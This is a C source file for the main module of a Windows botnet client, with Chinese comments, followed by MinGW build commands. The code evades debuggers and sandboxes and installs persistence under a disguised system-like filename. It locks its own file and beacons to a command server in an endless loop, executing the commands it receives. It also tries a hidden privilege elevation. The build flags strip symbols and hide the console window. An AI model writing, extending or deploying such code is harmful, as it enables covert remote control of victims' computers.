#pragma comment(linker, "/subsystem:console /entry:mainCRTStartup")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

#include "bot.h"
#include "persistence.h"
#include "security_checks.h"
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>

char bot_id[BOT_ID_SIZE] = {0};
HANDLE g_hTargetLockThread = NULL; // 安装文件的锁定线程

// 静默提权并运行自身
BOOL silent_elevate() {
    WCHAR selfPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, selfPath, MAX_PATH)) {
        printf("[Bot] GetModuleFileNameW failed\n");
        return FALSE;
    }

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = selfPath;
    sei.nShow = SW_HIDE;
    
    if (ShellExecuteExW(&sei)) {
        printf("[Bot] Elevation succeeded\n");
        return TRUE;
    } else {
        printf("[Bot] Elevation failed: %d\n", GetLastError());
        return FALSE;
    }
}

// 检查是否已安装
BOOL is_installed() {
    // 如果已设置安装路径，直接返回
    if (g_installedPath[0] != L'\0') {
        wprintf(L"[Bot] Installed path already set: %ls\n", g_installedPath);
        return TRUE;
    }
    
    // 尝试通过标记文件确定安装位置
    WCHAR deepPath[MAX_PATH];
    if (!build_install_path(deepPath, MAX_PATH)) {
        printf("[Bot] build_install_path failed\n");
        return FALSE;
    }
    
    WCHAR markerPath[MAX_PATH];
    wcscpy_s(markerPath, MAX_PATH, deepPath);
    wcscat_s(markerPath, MAX_PATH, L"winupdate.dat");
    
    if (GetFileAttributesW(markerPath) != INVALID_FILE_ATTRIBUTES) {
        // 发现标记文件，设置安装路径
        wcscpy_s(g_installedPath, MAX_PATH, deepPath);
        wcscat_s(g_installedPath, MAX_PATH, L"winlogonhlp.exe");
        wprintf(L"[Bot] Found installed file: %ls\n", g_installedPath);
        return TRUE;
    }
    
    printf("[Bot] Marker file not found\n");
    return FALSE;
}

// 启动文件锁定（锁定复制后的 EXE）
void start_lock_thread() {
    // 确保已安装且路径有效
    if (g_installedPath[0] == L'\0') {
        if (!is_installed()) {
            printf("[Bot] Not installed, skipping file lock\n");
            return;
        }
    }
    
    wprintf(L"[Bot] Locking installed file: %ls\n", g_installedPath);
    g_hTargetLockThread = CreateThread(
        NULL, 
        0, 
        lock_file_thread,
        g_installedPath, 
        0, 
        NULL
    );
    
    if (g_hTargetLockThread) {
        printf("[Bot] File lock thread started\n");
    } else {
        printf("[Bot] CreateThread failed: %d\n", GetLastError());
    }
}

// 主函数
int main() {
    printf("===== Bot starting =====\n");
    
    // === 安全检测 ===
    if (anti_debug() || check_user_activity()) {
        printf("[Security] Security checks failed, exiting silently\n");
        return 99; // 静默退出
    }
    printf("[Security] Security checks passed\n");

    // === 自动安装检测 ===
    if (!is_installed()) {
        printf("[Install] Not installed, starting persistence installation\n");
        install_persistence();
    } else {
        printf("[Install] Already installed\n");
    }

    // 启动文件锁定线程（锁定复制后的文件）
    start_lock_thread();

    // === 主业务逻辑 ===
    printf("[Bot] Generating bot ID\n");
    generate_bot_id();
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[Network] WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
    printf("[Network] WSAStartup succeeded\n");

    int communication_success = 0;
    
    while (1) {
        printf("[Network] Calling home...\n");
        call_home(&communication_success);
        
        if (communication_success) {
            printf("[Network] Call home succeeded\n");
        } else {
            printf("[Network] Call home failed\n");
        }
        
        char *cached_cmd;
        while ((cached_cmd = get_cached_command()) != NULL) {
            printf("[Command] Processing cached command\n");
            parse_and_execute_command(cached_cmd);
            free(cached_cmd);
        }
        
        // 随机睡眠25-30秒
        int sleep_time = 25000 + (rand() % 5000);
        printf("[Bot] Sleeping for %d ms\n", sleep_time);
        Sleep(sleep_time);
    }
    
    free_command_cache();
    WSACleanup();
    printf("[Network] Network resources cleaned up\n");
    
    // 清理线程
    if (g_hTargetLockThread) {
        printf("[Bot] Terminating file lock thread\n");
        TerminateThread(g_hTargetLockThread, 0);
        CloseHandle(g_hTargetLockThread);
        g_hTargetLockThread = NULL;
    }
    
    // 尝试重新启动
    printf("[Bot] Attempting to elevate privileges\n");
    if (!silent_elevate()) {
        printf("[Bot] Elevation failed, exiting\n");
        return 0;
    }
    
    // 等待新实例启动
    printf("[Bot] Waiting for new instance to start\n");
    Sleep(5000);
    return 0;
}

/* less good
x86_64-w64-mingw32-gcc \
$(find ./bot ./comm -name '*.c' -not -name '*_test.c') \
-o bot.exe \
-D_WIN32_WINNT=0x0A00 -DUNICODE -D_UNICODE \
-ffunction-sections -fdata-sections \
-Wl,--gc-sections,--strip-all,--subsystem=windows,--exclude-all-symbols \
-Os -flto -s \
-mwindows -static -static-libgcc \
-fno-ident -fno-stack-protector \
-Wno-builtin-declaration-mismatch -Wno-deprecated-declarations \
-I/usr/x86_64-w64-mingw32/include \
-I/usr/x86_64-w64-mingw32/include/jansson \
-L/usr/x86_64-w64-mingw32/lib \
-l:libjansson.a -liphlpapi -ladvapi32 -lws2_32 -lcrypt32 \
-Wl,--entry=mainCRTStartup
*/

/* big

x86_64-w64-mingw32-gcc $(find ./bot ./comm -name '*.c' -not -name '*_test.c') -o bot.exe \
-D_WIN32_WINNT=0x0A00 -DUNICODE -D_UNICODE \
-I/usr/x86_64-w64-mingw32/include \
-I/usr/x86_64-w64-mingw32/include/jansson \
-L/usr/x86_64-w64-mingw32/lib -lshlwapi \
-liphlpapi -ladvapi32 -lws2_32 -lcrypt32 -ljansson -lktmw32 \
-static -Wno-deprecated-declarations -fno-stack-protector -O0


*/
